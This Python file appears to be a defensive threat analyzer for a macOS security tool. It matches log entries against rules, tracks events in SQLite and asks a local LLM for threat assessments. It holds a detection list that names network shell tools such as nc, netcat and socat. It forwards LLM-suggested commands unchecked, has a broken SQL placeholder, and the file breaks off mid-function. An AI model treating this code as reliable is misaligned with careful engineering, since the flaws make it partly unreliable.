#!/usr/bin/env python3
"""
Enhanced Threat Analyzer for NIMDA Security System
Provides intelligent threat detection with optimized rules, state tracking, and AI context
"""

import logging
import re
import json
import time
import sqlite3
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
import sys
import os
import threading

# Add path to root directory for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.optimized_rule_manager import OptimizedRuleManager
from llm_security_agent import LLMSecurityAgent

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

class EnhancedThreatAnalyzer:
    """
    Enhanced threat analyzer with optimized rule matching, state tracking, and AI context
    """
    
    def __init__(self, db_path="security_events.db"):
        self.logger = logging.getLogger(__name__)
        self.db_path = db_path
        self.llm_agent = LLMSecurityAgent()
        self.rule_manager = OptimizedRuleManager()
        
        # Event state cache for deduplication and context
        self.event_state = {}
        self.event_history = []  # Recent events for context
        self.max_history = 50    # Maximum events to keep in memory
        
        # Initialize database tables for event state tracking
        self.init_database()
        
        # Initialize the rule manager
        self._load_rules()
        
        # Threading lock for database operations
        self.db_lock = threading.Lock()
        
    def _load_rules(self):
        """Load and compile security rules"""
        try:
            self.rules = self.rule_manager.get_parsed_rules()
            if not self.rules:
                self.logger.info("No rules found, attempting to download...")
                success_count = self.rule_manager.update_all_rules()
                if success_count > 0:
                    self.rules = self.rule_manager.get_parsed_rules()
                    self.logger.info(f"Downloaded and compiled {len(self.rules)} rules for analysis.")
                else:
                    self.logger.warning("Failed to download rules. Operating without rules.")
            else:
                self.logger.info(f"Loaded {len(self.rules)} rules for analysis.")
        except Exception as e:
            self.logger.error(f"Error loading rules: {e}")
            self.rules = []
    
    def init_database(self):
        """Initialize SQLite database for event state tracking"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Events table for persistent storage
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS security_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    event_type TEXT,
                    source TEXT,
                    target TEXT,
                    severity TEXT,
                    details TEXT,
                    event_hash TEXT UNIQUE,
                    analyzed INTEGER DEFAULT 0,
                    ai_analysis TEXT,
                    related_events TEXT
                )
            ''')
            
            # Event chains table for related events
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS event_chains (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    chain_id TEXT UNIQUE,
                    first_event_id INTEGER,
                    last_event_id INTEGER,
                    events_count INTEGER,
                    start_timestamp TEXT,
                    end_timestamp TEXT,
                    severity TEXT,
                    summary TEXT
                )
            ''')
            
            # Analyzed state table for tracking what's been processed
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS analyzed_states (
                    hash TEXT PRIMARY KEY,
                    last_seen TEXT,
                    occurrence_count INTEGER,
                    last_analysis TEXT
                )
            ''')
            
            conn.commit()
            conn.close()
            self.logger.info("Database initialized for event state tracking")
        except Exception as e:
            self.logger.error(f"Error initializing database: {e}")
    
    def analyze_log_entry(self, log_entry: str) -> Dict[str, Any]:
        """
        Analyze log entry using optimized rules and AI
        Incorporates state tracking to avoid duplicate analysis
        
        Args:
            log_entry: The log line to analyze
            
        Returns:
            Analysis results dictionary
        """
        start_time = time.time()
        
        # Generate a hash for this log entry to track state
        entry_hash = self._generate_entry_hash(log_entry)
        
        # Check if we've seen this exact entry recently
        if self._is_duplicate_entry(entry_hash):
            # If duplicate, return cached analysis with duplicate flag
            cached_analysis = self._get_cached_analysis(entry_hash)
            if cached_analysis:
                cached_analysis['is_duplicate'] = True
                cached_analysis['processing_time'] = time.time() - start_time
                return cached_analysis
        
        # Initialize the analysis result
        analysis_result = {
            'timestamp': datetime.now().isoformat(),
            'log_entry': log_entry,
            'threat_level': 'info',
            'rule_violations': [],
            'ai_analysis': None,
            'suggested_actions': [],
            'is_duplicate': False,
            'processing_time': 0,
            'entry_hash': entry_hash,
            'related_events': []
        }
        
        # Step 1: Check against optimized security rules
        rule_violations = self._check_security_rules(log_entry)
        analysis_result['rule_violations'] = rule_violations
        
        if rule_violations:
            highest_severity = max([v.get('severity', 'medium') for v in rule_violations], 
                                key=lambda s: {'low': 1, 'medium': 2, 'high': 3, 'critical': 4}.get(s, 0))
            analysis_result['threat_level'] = highest_severity
            self.logger.warning(f"Found {len(rule_violations)} rule violations in log entry")
        
        # Step 2: Find related events to provide context
        related_events = self._find_related_events(log_entry)
        analysis_result['related_events'] = related_events
        
        # Step 3: AI analysis with context from related events
        try:
            if rule_violations or len(related_events) > 2:  # Only use AI if needed
                ai_analysis = self._perform_ai_analysis_with_context(log_entry, rule_violations, related_events)
                analysis_result['ai_analysis'] = ai_analysis
                
                # Update threat level based on AI analysis
                if ai_analysis and 'threat_level' in ai_analysis:
                    ai_threat_level = ai_analysis['threat_level'].lower()
                    if ai_threat_level in ['high', 'critical'] and analysis_result['threat_level'] != 'critical':
                        analysis_result['threat_level'] = ai_threat_level
        except Exception as e:
            self.logger.error(f"AI analysis error: {e}")
            analysis_result['ai_analysis_error'] = str(e)
        
        # Step 4: Generate suggested actions
        analysis_result['suggested_actions'] = self._generate_suggested_actions(analysis_result)
        
        # Step 5: Save event to database and update state
        self._save_event_and_update_state(analysis_result)
        
        # Calculate processing time
        analysis_result['processing_time'] = time.time() - start_time
        
        return analysis_result
    
    def _check_security_rules(self, log_entry: str) -> List[Dict[str, Any]]:
        """
        Check log entry against security rules using optimized matching
        """
        return self.rule_manager.match_rules(log_entry)
    
    def _generate_entry_hash(self, log_entry: str) -> str:
        """Generate a stable hash for a log entry for deduplication"""
        # Extract timestamp pattern to exclude from hash if present
        timestamp_pattern = r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:[+-]\d{2}:?\d{2})?'
        
        # Remove timestamp from log entry for hashing to identify similar events
        normalized_entry = re.sub(timestamp_pattern, 'TIMESTAMP', log_entry)
        
        # Hash the normalized entry
        return hashlib.md5(normalized_entry.encode()).hexdigest()
    
    def _is_duplicate_entry(self, entry_hash: str) -> bool:
        """Check if this entry has been seen recently"""
        try:
            with self.db_lock:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                # Check if this hash exists in analyzed states within the last hour
                cursor.execute('''
                    SELECT hash FROM analyzed_states 
                    WHERE hash = ? AND datetime(last_seen) > datetime('now', '-1 hour')
                ''', (entry_hash,))
                
                result = cursor.fetchone()
                conn.close()
                
                return result is not None
        except Exception as e:
            self.logger.error(f"Error checking duplicate entry: {e}")
            return False
    
    def _get_cached_analysis(self, entry_hash: str) -> Optional[Dict[str, Any]]:
        """Get cached analysis for a previously seen entry"""
        try:
            with self.db_lock:
                conn = sqlite3.connect(self.db_path)
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                
                cursor.execute('''
                    SELECT * FROM security_events 
                    WHERE event_hash = ? 
                    ORDER BY timestamp DESC 
                    LIMIT 1
                ''', (entry_hash,))
                
                row = cursor.fetchone()
                conn.close()
                
                if row:
                    # Convert row to dictionary
                    event = dict(row)
                    # Parse JSON fields
                    event['details'] = json.loads(event['details']) if event['details'] else {}
                    event['ai_analysis'] = json.loads(event['ai_analysis']) if event['ai_analysis'] else None
                    event['related_events'] = json.loads(event['related_events']) if event['related_events'] else []
                    
                    return {
                        'timestamp': event['timestamp'],
                        'log_entry': event['details'].get('log_entry', ''),
                        'threat_level': event['severity'],
                        'rule_violations': event['details'].get('rule_violations', []),
                        'ai_analysis': event['ai_analysis'],
                        'suggested_actions': event['details'].get('suggested_actions', []),
                        'related_events': event['related_events'],
                        'is_cached': True,
                        'entry_hash': entry_hash
                    }
            
            return None
        except Exception as e:
            self.logger.error(f"Error getting cached analysis: {e}")
            return None
    
    def _find_related_events(self, log_entry: str, max_events: int = 5, hours: int = 1) -> List[Dict[str, Any]]:
        """Find related events to provide context for AI analysis"""
        related_events = []
        
        try:
            # Extract key identifiers from log entry
            ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
            ips = re.findall(ip_pattern, log_entry)
            
            process_pattern = r'\b(?:pid|process)[=:]\s*(\w+)'
            process_matches = re.findall(process_pattern, log_entry, re.IGNORECASE)
            processes = [p for p in process_matches if p]
            
            user_pattern = r'\b(?:user|username)[=:]\s*(\w+)'
            user_matches = re.findall(user_pattern, log_entry, re.IGNORECASE)
            users = [u for u in user_matches if u]
            
            # If we have identifiers, search for related events
            if ips or processes or users:
                with self.db_lock:
                    conn = sqlite3.connect(self.db_path)
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    
                    # Build query conditions for each identifier type
                    conditions = []
                    params = []
                    
                    if ips:
                        placeholders = ','.join(['?'] * len(ips))
                        conditions.append(f"(details LIKE '%' || ? || '%' OR source IN ({placeholders}) OR target IN ({placeholders}))")
                        params.extend(['ip'] + ips + ips)
                    
                    if processes:
                        placeholders = ','.join(['?'] * len(processes))
                        conditions.append(f"(details LIKE '%' || ? || '%' OR source IN ({placeholders}))")
                        params.extend(['process'] + processes)
                    
                    if users:
                        placeholders = ','.join(['?'] * len(users))
                        conditions.append(f"(details LIKE '%' || ? || '%' OR source IN ({placeholders}))")
                        params.extend(['user'] + users)
                    
                    # Combine conditions with OR
                    where_clause = " OR ".join(conditions)
                    
                    # Query recent related events
                    cursor.execute(f'''
                        SELECT * FROM security_events 
                        WHERE ({where_clause})
                        AND datetime(timestamp) > datetime('now', '-{hours} hours')
                        ORDER BY timestamp DESC
                        LIMIT ?
                    ''', params + [max_events])
                    
                    rows = cursor.fetchall()
                    conn.close()
                    
                    # Convert rows to dictionaries
                    for row in rows:
                        event = dict(row)
                        # Parse JSON fields
                        event['details'] = json.loads(event['details']) if event['details'] else {}
                        
                        # Add to related events
                        related_events.append({
                            'timestamp': event['timestamp'],
                            'event_type': event['event_type'],
                            'source': event['source'],
                            'target': event['target'],
                            'severity': event['severity'],
                            'event_hash': event['event_hash'],
                            'details': event['details']
                        })
        except Exception as e:
            self.logger.error(f"Error finding related events: {e}")
        
        return related_events
    
    def _perform_ai_analysis_with_context(
        self, 
        log_entry: str, 
        rule_violations: List[Dict], 
        related_events: List[Dict]
    ) -> Optional[Dict[str, Any]]:
        """
        Perform AI analysis with context from related events
        This provides a chain of events to the LLM rather than a single event
        """
        if not self.llm_agent.check_ollama_connection():
            self.logger.warning("Ollama not available, skipping AI analysis")
            return None
        
        # Prepare context for LLM
        context = "You are a macOS security expert analyzing system logs for potential threats."
        
        # Format the context with related events
        event_context = self._format_event_context(log_entry, rule_violations, related_events)
        
        # Build the prompt with context from related events
        prompt = f"""
Analyze this security log entry and its related events:

{event_context}

Please provide a JSON response with:
1. threat_level: (info/medium/high/critical)
2. analysis: Brief analysis focusing on the chain of events and potential security implications
3. confidence: Confidence level (0-100)
4. recommended_actions: List of specific recommended actions
5. event_chain_summary: A concise summary of the chain of events and their relationship

Format your response as valid JSON.
"""
        
        try:
            response = self.llm_agent.query_ollama(prompt, context)
            
            # Try to parse JSON response
            try:
                ai_analysis = json.loads(response)
                return ai_analysis
            except json.JSONDecodeError:
                # If not valid JSON, extract what we can
                return {
                    'threat_level': self._extract_value(response, 'threat_level') or 'info',
                    'analysis': response[:500],  # Limit length
                    'confidence': self._extract_value(response, 'confidence') or 50,
                    'recommended_actions': []
                }
        except Exception as e:
            self.logger.error(f"Error in AI analysis: {e}")
            return None
    
    def _format_event_context(
        self, 
        log_entry: str, 
        rule_violations: List[Dict], 
        related_events: List[Dict]
    ) -> str:
        """Format the context for AI analysis with related events"""
        context_parts = [f"Current log entry: {log_entry}"]
        
        # Add rule violations
        if rule_violations:
            context_parts.append("\nRule violations:")
            for i, violation in enumerate(rule_violations, 1):
                context_parts.append(f"{i}. [{violation.get('severity', 'medium')}] {violation.get('message', 'Unknown rule')}")
        
        # Add related events in chronological order
        if related_events:
            sorted_events = sorted(related_events, key=lambda e: e.get('timestamp', ''))
            context_parts.append("\nRelated events (chronological order):")
            for i, event in enumerate(sorted_events, 1):
                # Format timestamp for readability
                ts = event.get('timestamp', '')[:19].replace('T', ' ') if event.get('timestamp') else 'Unknown time'
                details = event.get('details', {})
                log = details.get('log_entry', 'No log available')
                severity = event.get('severity', 'info').upper()
                
                context_parts.append(f"{i}. [{ts}] [{severity}] {event.get('event_type', 'Event')}: {log[:100]}")
        
        return "\n".join(context_parts)
    
    def _extract_value(self, text: str, key: str) -> Any:
        """Extract a value from non-JSON text by looking for key patterns"""
        patterns = [
            rf'{key}["\']?\s*[:=]\s*["\']?([^"\',$\n]+)["\']?',  # key: value or key = value
            rf'{key}["\']?\s*[:=]\s*"([^"]+)"',  # key: "value"
            rf'{key}["\']?\s*[:=]\s*\'([^\']+)\'',  # key: 'value'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        
        return None
    
    def _generate_suggested_actions(self, analysis_result: Dict[str, Any]) -> List[str]:
        """Generate suggested actions based on analysis and event context"""
        actions = []
        threat_level = analysis_result.get('threat_level', 'info')
        
        # Base actions based on threat level
        if threat_level in ['high', 'critical']:
            actions.extend([
                "Immediately check active processes",
                "Analyze network connections",
                "Verify file integrity of critical system files"
            ])
        elif threat_level == 'medium':
            actions.extend([
                "Monitor for further suspicious activity",
                "Check logs for similar events"
            ])
        
        # Add actions from AI analysis
        ai_analysis = analysis_result.get('ai_analysis', {})
        if ai_analysis and 'recommended_actions' in ai_analysis:
            ai_actions = ai_analysis['recommended_actions']
            if isinstance(ai_actions, list):
                actions.extend(ai_actions)
        
        # Add actions based on rule violations
        for violation in analysis_result.get('rule_violations', []):
            if 'bash' in violation.get('content', '').lower():
                actions.append("Check shell command history")
            elif 'network' in violation.get('message', '').lower():
                actions.append("Analyze network traffic")
        
        # Add actions based on related events
        if analysis_result.get('related_events'):
            has_network_events = any('network' in e.get('event_type', '').lower() for e in analysis_result['related_events'])
            has_process_events = any('process' in e.get('event_type', '').lower() for e in analysis_result['related_events'])
            
            if has_network_events and has_process_events:
                actions.append("Investigate possible process-network connection chain")
        
        # Remove duplicates while preserving order
        seen = set()
        unique_actions = []
        for action in actions:
            if action not in seen:
                seen.add(action)
                unique_actions.append(action)
        
        return unique_actions[:7]  # Limit to 7 actions
    
    def _save_event_and_update_state(self, analysis_result: Dict[str, Any]) -> None:
        """Save event to database and update state tracking"""
        try:
            # Extract key fields for database
            timestamp = analysis_result['timestamp']
            log_entry = analysis_result['log_entry']
            threat_level = analysis_result['threat_level']
            entry_hash = analysis_result['entry_hash']
            
            # Extract source and target if possible
            source, target = self._extract_source_target(log_entry)
            
            # Determine event type
            event_type = self._determine_event_type(log_entry)
            
            with self.db_lock:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                # Update or insert into analyzed_states
                cursor.execute('''
                    INSERT OR REPLACE INTO analyzed_states (hash, last_seen, occurrence_count, last_analysis)
                    VALUES (?, ?, 
                        COALESCE((SELECT occurrence_count FROM analyzed_states WHERE hash = ?) + 1, 1),
                        ?
                    )
                ''', (entry_hash, timestamp, entry_hash, json.dumps({'threat_level': threat_level})))
                
                # Insert into security_events
                cursor.execute('''
                    INSERT OR IGNORE INTO security_events (
                        timestamp, event_type, source, target, severity, details, 
                        event_hash, analyzed, ai_analysis, related_events
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    timestamp,
                    event_type,
                    source,
                    target,
                    threat_level,
                    json.dumps({
                        'log_entry': log_entry,
                        'rule_violations': analysis_result.get('rule_violations', []),
                        'suggested_actions': analysis_result.get('suggested_actions', [])
                    }),
                    entry_hash,
                    1 if analysis_result.get('ai_analysis') else 0,
                    json.dumps(analysis_result.get('ai_analysis')) if analysis_result.get('ai_analysis') else None,
                    json.dumps(analysis_result.get('related_events', []))
                ))
                
                # If there are related events, try to create an event chain
                if analysis_result.get('related_events'):
                    self._create_or_update_event_chain(cursor, analysis_result)
                
                conn.commit()
                conn.close()
                
                # Update in-memory event history
                self.event_history.append({
                    'timestamp': timestamp,
                    'event_type': event_type,
                    'source': source,
                    'target': target,
                    'severity': threat_level,
                    'event_hash': entry_hash,
                    'log_entry': log_entry
                })
                
                # Limit event history size
                if len(self.event_history) > self.max_history:
                    self.event_history = self.event_history[-self.max_history:]
                
        except Exception as e:
            self.logger.error(f"Error saving event: {e}")
    
    def _extract_source_target(self, log_entry: str) -> Tuple[str, str]:
        """Extract source and target from log entry"""
        source = "unknown"
        target = "unknown"
        
        # Try to identify source and target
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        ips = re.findall(ip_pattern, log_entry)
        
        if len(ips) >= 2:
            # If we have at least two IPs, assume first is source, second is target
            source = ips[0]
            target = ips[1]
        elif len(ips) == 1:
            # If only one IP, use additional context to determine if source or target
            if any(x in log_entry.lower() for x in ["from", "source", "origin"]):
                source = ips[0]
            else:
                target = ips[0]
        
        # Check for process information
        process_pattern = r'\b(?:pid|process)[=:]\s*(\w+)'
        process_matches = re.findall(process_pattern, log_entry, re.IGNORECASE)
        if process_matches:
            if source == "unknown":
                source = f"process:{process_matches[0]}"
        
        # Check for user information
        user_pattern = r'\b(?:user|username)[=:]\s*(\w+)'
        user_matches = re.findall(user_pattern, log_entry, re.IGNORECASE)
        if user_matches:
            if source == "unknown":
                source = f"user:{user_matches[0]}"
        
        return source, target
    
    def _determine_event_type(self, log_entry: str) -> str:
        """Determine event type from log entry"""
        log_lower = log_entry.lower()
        
        if any(x in log_lower for x in ["network", "connection", "connect", "socket", "tcp", "udp"]):
            return "network_event"
        elif any(x in log_lower for x in ["process", "pid", "exec", "run", "started"]):
            return "process_event"
        elif any(x in log_lower for x in ["file", "write", "read", "open", "create"]):
            return "file_event"
        elif any(x in log_lower for x in ["user", "login", "auth", "password"]):
            return "authentication_event"
        elif any(x in log_lower for x in ["usb", "device", "mounted", "peripheral"]):
            return "device_event"
        else:
            return "system_event"
    
    def _create_or_update_event_chain(self, cursor, analysis_result: Dict[str, Any]) -> None:
        """Create or update an event chain for related events"""
        try:
            related_events = analysis_result.get('related_events', [])
            current_timestamp = analysis_result['timestamp']
            event_hashes = [e.get('event_hash') for e in related_events if e.get('event_hash')]
            event_hashes.append(analysis_result['entry_hash'])
            
            # Generate a chain ID based on the hashes
            chain_base = '_'.join(sorted(event_hashes))
            chain_id = hashlib.md5(chain_base.encode()).hexdigest()
            
            # Check if chain exists
            cursor.execute("SELECT id FROM event_chains WHERE chain_id = ?", (chain_id,))
            existing_chain = cursor.fetchone()
            
            if existing_chain:
                # Update existing chain
                cursor.execute('''
                    UPDATE event_chains SET 
                        events_count = events_count + 1,
                        end_timestamp = ?,
                        severity = ?
                    WHERE chain_id = ?
                ''', (
                    current_timestamp,
                    analysis_result['threat_level'],
                    chain_id
                ))
            else:
                # Create new chain
                cursor.execute('''
                    INSERT INTO event_chains (
                        chain_id, first_event_id, last_event_id, events_count, 
                        start_timestamp, end_timestamp, severity, summary
                    ) VALUES (?, 
                        (SELECT id FROM security_events WHERE event_hash = ? LIMIT 1),
                        (SELECT id FROM security_events WHERE event_hash = ? LIMIT 1),
                        ?, ?, ?, ?, ?
                    )
                ''', (
                    chain_id,
                    related_events[0].get('event_hash') if related_events else analysis_result['entry_hash'],
                    analysis_result['entry_hash'],
                    len(related_events) + 1,
                    related_events[0].get('timestamp') if related_events else current_timestamp,
                    current_timestamp,
                    analysis_result['threat_level'],
                    analysis_result.get('ai_analysis', {}).get('event_chain_summary', 'Related security events')
                ))
                
        except Exception as e:
            self.logger.error(f"Error creating event chain: {e}")
    
    def analyze_process_activity(self, process_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Analyze process activity for threats
        Utilizes event history and state tracking
        
        Args:
            process_info: Process information dict (PID, name, etc.)
            
        Returns:
            Analysis results
        """
        analysis_result = {
            'timestamp': datetime.now().isoformat(),
            'process_info': process_info,
            'threat_level': 'info',
            'suspicious_indicators': [],
            'ai_analysis': None,
            'suggested_commands': [],
            'related_events': []
        }
        
        # Find related events for this process to provide context
        pid = process_info.get('pid')
        name = process_info.get('name', '').lower()
        
        if pid or name:
            # Create a log entry for rule matching
            log_entry = f"Process {name} (PID: {pid}) detected with user {process_info.get('user', 'unknown')}"
            
            # Check for suspicious indicators
            analysis_result['suspicious_indicators'] = self._check_suspicious_process(process_info)
            
            # Find related events
            analysis_result['related_events'] = self._find_related_events_for_process(pid, name)
            
            if analysis_result['suspicious_indicators']:
                analysis_result['threat_level'] = 'medium'
            
            # Use AI for deeper analysis if we have suspicious indicators or related events
            if analysis_result['suspicious_indicators'] or analysis_result['related_events']:
                try:
                    ai_analysis = self._perform_process_ai_analysis(
                        process_info, 
                        analysis_result['suspicious_indicators'],
                        analysis_result['related_events']
                    )
                    analysis_result['ai_analysis'] = ai_analysis
                    
                    if ai_analysis and ai_analysis.get('threat_level') == 'high':
                        analysis_result['threat_level'] = 'high'
                except Exception as e:
                    self.logger.error(f"Error in AI process analysis: {e}")
            
            # Generate suggested commands
            analysis_result['suggested_commands'] = self._generate_process_commands(analysis_result)
            
            # Save event for future reference
            self._save_process_event(analysis_result)
        
        return analysis_result
    
    def _check_suspicious_process(self, process_info: Dict[str, Any]) -> List[str]:
        """Check for suspicious indicators in a process"""
        indicators = []
        
        process_name = process_info.get('name', '').lower()
        process_path = process_info.get('path', '').lower()
        
        # Suspicious paths
        suspicious_paths = ['/tmp/', '/var/tmp/', '/dev/shm/', '/private/tmp/']
        for path in suspicious_paths:
            if path in process_path:
                indicators.append(f"Process running from suspicious path: {path}")
        
        # Suspicious process names
        suspicious_names = ['nc', 'netcat', 'nmap', 'tcpdump', 'wireshark', 'socat']
        if process_name in suspicious_names:
            indicators.append(f"Potentially dangerous process: {process_name}")
        
        # Processes with high privileges
        if process_info.get('user') == 'root' and process_name not in [
            'kernel_task', 'launchd', 'systemd', 'system'
        ]:
            indicators.append("Process running with root privileges")
        
        # High CPU usage
        if process_info.get('cpu_percent', 0) > 70:
            indicators.append(f"High CPU usage: {process_info.get('cpu_percent')}%")
        
        # High memory usage
        if process_info.get('memory_percent', 0) > 50:
            indicators.append(f"High memory usage: {process_info.get('memory_percent')}%")
        
        return indicators
    
    def _find_related_events_for_process(self, pid, name, max_events=5) -> List[Dict[str, Any]]:
        """Find events related to a specific process"""
        related_events = []
        
        try:
            if pid or name:
                with self.db_lock:
                    conn = sqlite3.connect(self.db_path)
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    
                    # Search for events related to this process
                    params = []
                    conditions = []
                    
                    if pid:
                        conditions.append("(source LIKE ? OR target LIKE ? OR details LIKE ?)")
                        pid_pattern = f"%process:{pid}%"
                        params.extend([pid_pattern, pid_pattern, f"%\"pid\": {pid}%"])
                    
                    if name:
                        conditions.append("(source LIKE ? OR target LIKE ? OR details LIKE ?)")
                        name_pattern = f"%{name}%"
                        params.extend([name_pattern, name_pattern, name_pattern])
                    
                    # Combine conditions with OR
                    where_clause = " OR ".join(conditions)
                    
                    # Get recent related events
                    cursor.execute(f'''
                        SELECT * FROM security_events 
                        WHERE {where_clause}
                        AND datetime(timestamp) > datetime('now', '-2 hours')
                        ORDER BY timestamp DESC
                        LIMIT ?
                    ''', params + [max_events])
                    
                    rows = cursor.fetchall()
                    conn.close()
                    
                    # Convert rows to dictionaries
                    for row in rows:
                        event = dict(row)
                        # Parse JSON fields
                        event['details'] = json.loads(event['details']) if event['details'] else {}
                        
                        # Add to related events
                        related_events.append({
                            'timestamp': event['timestamp'],
                            'event_type': event['event_type'],
                            'source': event['source'],
                            'target': event['target'],
                            'severity': event['severity'],
                            'log_entry': event['details'].get('log_entry', '')
                        })
        except Exception as e:
            self.logger.error(f"Error finding related events for process: {e}")
        
        return related_events
    
    def _perform_process_ai_analysis(
        self, 
        process_info: Dict, 
        suspicious_indicators: List[str],
        related_events: List[Dict]
    ) -> Optional[Dict]:
        """Perform AI analysis of process with context"""
        if not self.llm_agent.check_ollama_connection():
            return None
        
        context = "You are a macOS security expert analyzing potentially suspicious processes."
        
        # Build context with process info and related events
        context_lines = [
            "Process Information:",
            f"- PID: {process_info.get('pid', 'N/A')}",
            f"- Name: {process_info.get('name', 'N/A')}",
            f"- Path: {process_info.get('path', 'N/A')}",
            f"- User: {process_info.get('user', 'N/A')}",
            f"- CPU: {process_info.get('cpu_percent', 'N/A')}%",
            f"- Memory: {process_info.get('memory_percent', 'N/A')}%"
        ]
        
        # Add suspicious indicators
        if suspicious_indicators:
            context_lines.append("\nSuspicious Indicators:")
            for indicator in suspicious_indicators:
                context_lines.append(f"- {indicator}")
        else:
            context_lines.append("\nSuspicious Indicators: None detected")
        
        # Add related events
        if related_events:
            context_lines.append("\nRelated Events (chronological order):")
            sorted_events = sorted(related_events, key=lambda e: e.get('timestamp', ''))
            for i, event in enumerate(sorted_events, 1):
                ts = event.get('timestamp', '')[:19].replace('T', ' ') if event.get('timestamp') else 'Unknown time'
                severity = event.get('severity', 'info').upper()
                context_lines.append(f"{i}. [{ts}] [{severity}] {event.get('event_type', 'Event')}: {event.get('log_entry', '')[:100]}")
        
        prompt = f"""
Analyze this macOS process for security threats:

{chr(10).join(context_lines)}

Provide a JSON response with:
1. threat_level: (info/medium/high/critical)
2. analysis: Brief threat assessment considering the process and its related events
3. confidence: Confidence level (0-100)
4. recommended_commands: List of safe investigation commands for macOS
5. threat_summary: A concise summary of potential threats posed by this process

Format as valid JSON.
"""
        
        try:
            response = self.llm_agent.query_ollama(prompt, context)
            return json.loads(response)
        except json.JSONDecodeError:
            # If not valid JSON, extract what we can
            return {
                'threat_level': self._extract_value(response, 'threat_level') or 'info',
                'analysis': response[:500],
                'confidence': self._extract_value(response, 'confidence') or 50,
                'recommended_commands': []
            }
        except Exception:
            return None
    
    def _generate_process_commands(self, analysis_result: Dict[str, Any]) -> List[str]:
        """Generate safe commands for investigating a process"""
        commands = []
        process_info = analysis_result['process_info']
        pid = process_info.get('pid')
        
        if pid:
            # Basic investigation commands
            commands.extend([
                f"lsof -p {pid}",  # Open files
                f"ps -p {pid} -o pid,ppid,user,comm,args",  # Detailed process info
            ])
            
            threat_level = analysis_result['threat_level']
            if threat_level in ['high', 'critical']:
                commands.extend([
                    f"sudo fs_usage -p {pid}",  # File system activity
                    f"sudo dtrace -n 'syscall:::entry /pid == {pid}/ {{ printf(\"%s(%s)\", probefunc, copyinstr(arg0)); }}'",  # System calls
                ])
        
        # Add commands from AI analysis
        ai_analysis = analysis_result.get('ai_analysis')
        if ai_analysis and 'recommended_commands' in ai_analysis:
            ai_commands = ai_analysis['recommended_commands']
            if isinstance(ai_commands, list):
                commands.extend(ai_commands)
        
        return commands[:5]  # Limit to 5 commands
    
    def _save_process_event(self, analysis_result: Dict[str, Any]) -> None:
        """Save process analysis as an event for future reference"""
        try:
            process_info = analysis_result['process_info']
            pid = process_info.get('pid')
            name = process_info.get('name', 'unknown')
            
            # Create event data
            timestamp = analysis_result['timestamp']
            event_type = "process_analysis"
            source = f"process:{pid}" if pid else f"process:{name}"
            target = process_info.get('path', 'unknown')
            threat_level = analysis_result['threat_level']
            
            # Generate a hash for deduplication
            event_data = f"{pid}_{name}_{threat_level}_{datetime.now().strftime('%Y%m%d_%H')}"
            event_hash = hashlib.md5(event_data.encode()).hexdigest()
            
            with self.db_lock:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
                # Check if we've analyzed this process recently
                cursor.execute('''
                    SELECT id FROM security_events 
                    WHERE event_hash = ? AND datetime(timestamp) > datetime('now', '-1 hour')
                ''', (event_hash,))
                
                existing = cursor.fetchone()
                if not existing:
                    # Insert as a new event
                    cursor.execute('''
                        INSERT INTO security_events (
                            timestamp, event_type, source, target, severity, details, 
                            event_hash, analyzed, ai_analysis, related_events
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        timestamp,
                        event_type,
                        source,
                        target,
                        threat_level,
                        json.dumps({
                            'process_info': process_info,
                            'suspicious_indicators': analysis_result.get('suspicious_indicators', []),
                            'suggested_commands': analysis_result.get('suggested_commands', [])
                        }),
                        event_hash,
                        1 if analysis_result.get('ai_analysis') else 0,
                        json.dumps(analysis_result.get('ai_analysis')) if analysis_result.get('ai_analysis') else None,
                        json.dumps(analysis_result.get('related_events', []))
                    ))
                    
                    conn.commit()
                
                conn.close()
                
        except Exception as e:
            self.logger.error(f"Error saving process event: {e}")

    def get_recent_security_events(self, hours: int = 24, limit: int = 100) -> List[Dict[str, Any]]:
        """Get recent security events from database"""
        events = []
        
        try:
            with self.db_lock:
                conn = sqlite3.connect(self.db_path)
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                
                # Get recent events
                cursor.execute('''
                    SELECT * FROM security_events 
                    WHERE datetime(timestamp) > datetime('now', '-? hours')
                    ORDER BY timestamp DESC
                    LIMIT ?
                ''', (hours, limit))
                
                rows = cursor.fetchall()
                conn.close()
                
                # Convert rows to dictionaries
                for row in rows:
                    event = dict(row)
                    # Parse JSON fields
                    event['details'] = json.loads(event['details']) if event['details'] else {}
                    event['ai_analysis'] = json.loads(event['ai_analysis']) if event['ai_analysis'] else None
                    event['related_events'] = json.loads(event['related_events']) if event['related_events'] else []
                    events.append(event)
                
        except Exception as e:
            self.logger.error(f"Error getting recent events: {e}")
        
        return events
    
    def get_threat_summary(self) -> Dict[str, Any]:
        """Get a summary of current threat status"""
        summary = {
            'timestamp': datetime.now().isoformat(),
            'threat_level': 'info',
            'event_counts': {
                'total': 0,
                'info': 0,
                'medium': 0,
                'high': 0,
                'critical': 0
            },
            'recent_events': [],
            'active_chains': 0
        }
        
        try:
            with self.db_lock:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                
